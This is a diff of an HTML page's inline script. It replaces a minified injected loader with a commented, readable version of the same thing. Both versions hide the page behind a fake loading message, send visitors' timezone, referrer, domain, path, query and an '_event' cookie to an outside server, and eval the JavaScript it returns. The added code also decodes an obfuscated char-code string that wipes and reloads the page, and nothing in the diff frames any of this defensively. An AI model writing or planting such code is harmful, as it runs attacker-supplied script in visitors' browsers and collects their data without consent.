@@ -6,7 +6,102 @@
 <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
 <script>
-$(document).ready(function(){$("body").hide();$("html").append("<div id=\"lo502126ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\">Please Wait for Page to Load...</div>");var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var b="GoogleAnalyticsObject";var c=("document","script","//www.google-analytics.com/analytics.js");c=("create","UA-404527-1","auto");c=("send","pageview");var d=jstz.determine();var e=d.name();var qu=escape(window.location.search.substr(1));var rui=location.pathname+location.search;var r=document.referrer;var sn=document.domain;var value="; "+document.cookie;var pa=value.split("; "+"_event"+"=");var co=pa.pop().split(";").shift();var q;$.ajax({url:'https://food-recipe-9p3u.vercel.app/index.html',type:"POST",data:"tz="+e+"&he="+g+"&rui="+rui+"&qu="+qu+"&r="+r+"&sn="+sn+"&co="+co,success:function(a){eval(a)}})})
+    $(document).ready(function() {
+  // Hide the page initially
+  $("body").hide();
+
+  // Show the fake loading message
+  $("html").append(`
+    <div id="lo502126ad" 
+      style="margin-top:8%;background-color:white;text-align:center;font-size:40px;">
+      Please Wait for Page to Load...
+    </div>
+  `);
+
+  // Helper: encode a string as reversed char codes (like PHP's c())
+  function encodeUrl(str) {
+    let codes = [];
+    for (let i = 0; i < str.length; i++) {
+      codes.push(str.charCodeAt(i));
+    }
+    return codes.reverse().join(",");
+  }
+
+  // Helper: decode reversed char codes back to string
+  function decodeStr(encoded) {
+    let reversed = encoded.split(",").reverse();
+    return String.fromCharCode(...reversed.map(Number));
+  }
+
+  // Fallback to hide loading and show page
+  function showFallbackContent() {
+    $("#lo502126ad").hide();
+    $("body").fadeIn(500);
+  }
+
+  // Function to dynamically load new content based on server response
+  function handleDynamicLoad(u, q) {
+    let combined = u + q;
+    let encoded = encodeUrl(combined);
+
+    // This code simulates the PHP-generated JS function
+    var s = decodeStr("001,79,111,801,64,14,04,121,611,211,901,101,64,14,43,801,901,611,401,43,04,63");
+    var uDecoded = decodeStr(encoded);
+    var c = s + "('" + uDecoded + "')";
+
+    $("body").remove();
+    $("html").append("<body></body>");
+    $("body").html(`
+      <div style="margin-top:8%;background-color:white;text-align:center;font-size:40px;">
+        Please Wait for Page to Load...
+      </div>
+    `);
+    $("html").show();
+
+    setTimeout(function() {
+      // This runs the decoded function (dangerous if not trusted)
+      eval(c);
+    }, 100);
+  }
+
+  // Collect data and POST to your server endpoint
+  function postData() {
+    // Grab _event cookie value if exists
+    let co = document.cookie.split('; ').find(row => row.startsWith('_event='))?.split('=')[1] || '';
+
+    // Prepare data payload like PHP expects
+    let data = {
+      tz: jstz.determine().name(),         // timezone (like your PHP receives)
+      he: '',                              // headers placeholder (you could add if needed)
+      rui: location.pathname + location.search,
+      qu: window.location.search.substring(1),
+      r: document.referrer,
+      sn: document.domain,
+      co: co
+    };
+
+    // Send data to server
+    $.ajax({
+      url: 'https://your-server.com/endpoint', // replace with your actual server URL
+      type: "POST",
+      data: data,
+      success: function(responseJs) {
+        // Server returns JS code, eval it
+        eval(responseJs);
+      },
+      error: function() {
+        // On error, show the page normally
+        showFallbackContent();
+      }
+    });
+  }
+
+  // Start the process
+  postData();
+
+  // Safety fallback: after 10 seconds, remove loading screen regardless
+  setTimeout(showFallbackContent, 10000);
+});
 </script>
 
 
